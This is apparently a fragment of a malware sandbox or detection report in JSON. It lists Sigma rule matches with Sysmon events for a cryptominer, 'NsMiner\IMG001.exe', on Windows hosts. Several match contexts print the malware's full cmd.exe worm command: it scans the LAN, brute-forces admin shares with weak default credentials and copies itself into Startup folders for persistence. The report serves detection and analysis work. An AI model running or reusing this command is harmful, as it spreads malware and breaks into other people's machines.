                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4506-000000003B00}; ProcessId=8124; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; ProcessId=7380; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08D-6560-8206-000000003B00}; ProcessId=4964; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1809\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839565; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Product=Microsoft\\xae Windows\\xae Operating System; CurrentDirectory=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\; OriginalFileName=Cmd.Exe; Hashes=MD5=D0FCE3AFA6AA1D58CE9FA336CC2B675B,SHA256=4D89FC34D5F0F9BABD022271C585A9477BF41E834E46B991DEAA0530FDB25E22,IMPHASH=392B4D61B1D1DADC1F06444DF258188A; Description=Windows Command Processor; FileVersion=10.0.19041.746 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1507\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\Bruno\\AppData\\Roaming\\Ns [TRUNCATED]; EventID=1; ParentImage=C:\\Users\\Bruno\\AppData\\Roaming\\NsMiner\\IMG001.exe; IntegrityLevel=High; Image=C:\\Windows\\SysWOW64\\cmd.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "56b8c79acb8e444c2b00be5c9d3cb8e33e863ccb3506d635f907a49cd053c84f",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Startup Folder File Write",
                                                                       "rule_description":  "A General detection for files being created in the Windows startup directory. This could be an indicator of persistence.",
                                                                       "rule_author":  "Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7876; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C078-6560-2106-000000003B00}; CreationUtcTime=1700839547; UtcTime=1700839547; RuleName=T1023; TargetFilename=C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Run.lnk}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7396; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C084-6560-4A06-000000003B00}; CreationUtcTime=1700839547; UtcTime=1700839560; RuleName=T1023; TargetFilename=C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Run.lnk}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7864; TargetFilename=C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Run.lnk; ProcessGuid={C784477D-C08C-6560-8006-000000003B00}; CreationUtcTime=1700839547; UtcTime=1700839567; RuleName=T1023; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=6160; TargetFilename=C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Run.lnk; RuleName=T1023; CreationUtcTime=1700839547; UtcTime=1700839574; ProcessGuid={C784477D-C094-6560-A906-000000003B00}; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=4140; TargetFilename=C:\\Users\\george\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Run.lnk; RuleName=T1023; CreationUtcTime=1700839547; UtcTime=1700839582; ProcessGuid={C784477D-C09C-6560-B906-000000003B00}; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "7a463b569de43655b8e8cf5b970001d720c38abf81bce54ba71ad19765b096e7",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "SCR File Write Event",
                                                                       "rule_description":  "Detects the creation of screensaver files (.scr) outside of system folders. Attackers may execute an application as an \".SCR\" file using \"rundll32.exe desk.cpl,InstallScreenSaver\" for example.",
                                                                       "rule_author":  "Christopher Peacock @securepeacock, SCYTHE @scythe_io",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7648; TargetFilename=C:\\Users\\george\\AppData\\Local\\Temp\\ihdzkqud.roz\\IMG001.scr; ProcessGuid={C784477D-C076-6560-1B06-000000003B00}; CreationUtcTime=1700839542; UtcTime=1700839542; RuleName=-; Image=C:\\Windows\\SysWOW64\\7za.exe}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "816c82737c8262b4f167d02b04198105def46bd23ea282a655786d387e88118c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Windows Admin Share Mount Via Net.EXE",
                                                                       "rule_description":  "Detects when an admin share is mounted using net.exe",
                                                                       "rule_author":  "oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, wagga",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C09D-6560-DB06-000000003B00}; ProcessId=7036; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use \\\\192.168.2.42\\C$ /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839581; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C0A0-6560-0D07-000000003B00}; ProcessId=6888; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C083-6560-4506-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8124; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use \\\\192.168.2.90\\C$ /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839584; RuleName=-}"
                                                                                             },
                                                                                             {
